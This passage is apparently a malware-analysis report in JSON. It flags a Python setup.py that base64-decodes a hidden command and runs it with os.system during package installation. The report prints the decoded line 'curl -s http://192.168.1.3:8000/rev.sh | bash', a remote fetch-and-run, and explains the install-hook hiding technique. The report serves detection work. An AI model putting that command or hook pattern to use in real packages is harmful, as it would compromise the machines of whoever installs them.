{
  "purpose": "This script sets up a Python package using setuptools, but includes code designed to execute a hidden network request during installation or development setup.",
  "sources": "The base64-encoded string in the notmalfunc() function which is decoded and executed via os.system",
  "sinks": "os.system call executing decoded base64 string, which runs a URL command",
  "flows": "b64d() decodes base64 string -> os.system executes decoded command",
  "anomalies": "Use of base64 decoding to obfuscate a system command that makes a network request; the command is hidden and not directly visible in code. The command appears to perform an HTTP request to an external server.",
  "analysis": "The code imports setuptools modules and defines functions for setup. The key suspicious part is the function notmalfunc(), which decodes a base64-encoded string and executes it via os.system. The base64 string decodes to 'curl -s http://192.168.1.3:8000/rev.sh | bash', indicating a remote script download and execution. This function is invoked during the 'install' command via the AfterInstall class, which extends setuptools' install class, executing the malicious command during package installation. The use of base64 encoding and execution of external commands is a common obfuscation tactic to hide malicious activity.",
  "conclusion": "The code contains malicious behavior: it downloads and executes a remote script during package installation, which is a significant security risk. This suggests malicious intent, such as remote command execution or establishing a backdoor. The obfuscation and placement of the command confirm malicious activity.",
